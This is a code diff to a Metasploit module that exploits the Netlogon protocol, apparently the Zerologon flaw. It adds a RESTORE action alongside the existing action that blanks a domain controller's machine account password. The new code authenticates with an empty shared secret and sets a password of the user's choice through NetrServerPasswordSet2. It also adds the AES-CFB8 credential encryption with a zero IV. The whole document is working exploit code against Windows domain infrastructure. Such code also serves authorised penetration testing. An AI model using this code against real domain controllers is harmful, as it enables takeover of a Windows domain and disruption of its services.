@@ -10,6 +10,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   Netlogon = RubySMB::Dcerpc::Netlogon
+  EMPTY_SHARED_SECRET = OpenSSL::Digest::MD4.digest('')
 
   def initialize(info = {})
     super(update_info(info,
@@ -26,7 +27,8 @@ class MetasploitModule < Msf::Auxiliary
       },
       'License'        => MSF_LICENSE,
       'Actions' => [
-          [ 'REMOVE', { 'Description' => 'Remove the computer account password' } ],
+          [ 'REMOVE', { 'Description' => 'Remove the machine account password' } ],
+          [ 'RESTORE', { 'Description' => 'Restore the machine account password' } ]
         ],
       'DefaultAction'  => 'REMOVE',
       'References'     => [
@@ -39,6 +41,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(0),
         OptString.new('SERVER_NAME', [ true, 'The server\'s NetBIOS name', '', true ]),
+        OptString.new('PASSWORD', [ false, 'The password to set' ]),
       ])
 
   end
@@ -64,6 +67,8 @@ class MetasploitModule < Msf::Auxiliary
     case action.name
     when 'REMOVE'
       action_remove_password
+    when 'RESTORE'
+      action_restore_password
     end
   end
 
@@ -88,37 +93,64 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def netr_server_authenticate3
+  def action_restore_password
+    client_challenge = OpenSSL::Random.random_bytes(8)
+
+    response = netr_server_req_challenge(client_challenge: client_challenge)
+    session_key = Netlogon.calculate_session_key(EMPTY_SHARED_SECRET, client_challenge, response.server_challenge)
+    ppp = encrypt_netlogon_credential(client_challenge, session_key)
+
+    response = netr_server_authenticate3(client_credential: ppp)
+    unless response.status == 0
+      print_error('Failed to authenticate')
+      return
+    end
+
+    password = [datastore['PASSWORD']].pack('H*')
+
+    new_password_data = ("\x00" * (512 - password.length)) + password + [password.length].pack('V')
+    response = netr_server_password_set2(
+      authenticator: Netlogon::NetlogonAuthenticator.new(
+        credential: encrypt_netlogon_credential([ppp.unpack('Q').first + 10].pack('Q'), session_key),
+        timestamp: 10
+      ),
+      clear_new_password: encrypt_netlogon_credential(new_password_data, session_key)
+    )
+
+    if (response.last(4).unpack('V').first) == 0
+      print_good('Successfully set the computer password')
+    end
+  end
+
+  def netr_server_authenticate3(client_credential: nil)
     nrpc_call('NetrServerAuthenticate3',
       primary_name: "\\\\#{datastore['SERVER_NAME']}",
       account_name: "#{datastore['SERVER_NAME']}$",
       secure_channel_type: 6, # SERVER_SECURE_CHANNEL
       computer_name: datastore['SERVER_NAME'],
-      client_credential: [0] * 8,
+      client_credential: client_credential,
       flags: 0x212fffff
     )
   end
 
-  def netr_server_password_set2
+  def netr_server_password_set2(authenticator: nil, clear_new_password: nil)
+    authenticator ||= Netlogon::NetlogonAuthenticator.new
     request = NetrServerPasswordSet2Request.new(
       primary_name: "\\\\#{datastore['SERVER_NAME']}",
       account_name: "#{datastore['SERVER_NAME']}$",
       secure_channel_type: 6, # SERVER_SECURE_CHANNEL
       computer_name: datastore['SERVER_NAME'],
-      authenticator: Netlogon::NetlogonAuthenticator.new(
-        credential: [0] * 8,
-        timestamp: 0
-      ),
-      clear_new_password: [0] * 516
+      authenticator: authenticator,
+      clear_new_password: clear_new_password
     )
     dcerpc.call(request.opnum, request.to_binary_s)
   end
 
-  def netr_server_req_challenge
+  def netr_server_req_challenge(client_challenge: "\x00" * 8)
     nrpc_call('NetrServerReqChallenge',
       primary_name: "\\\\#{datastore['SERVER_NAME']}",
       computer_name: datastore['SERVER_NAME'],
-      client_challenge: [0] * 8
+      client_challenge: client_challenge
     )
   end
 
@@ -141,11 +173,18 @@ class MetasploitModule < Msf::Auxiliary
     ndr_enum               :secure_channel_type
     ndr_string             :computer_name
     netlogon_authenticator :authenticator
-    array                  :clear_new_password, type: :uint8, initial_length: 516
+    string                  :clear_new_password, length: 516
 
     def initialize_instance
       super
       @opnum = Netlogon::NETR_SERVER_PASSWORD_SET2
     end
+  end
+
+  def encrypt_netlogon_credential(input_data, key)
+    cipher = OpenSSL::Cipher.new('AES-128-CFB8').encrypt
+    cipher.iv = "\x00" * 16
+    cipher.key = key
+    cipher.update(input_data) + cipher.final
   end
 end
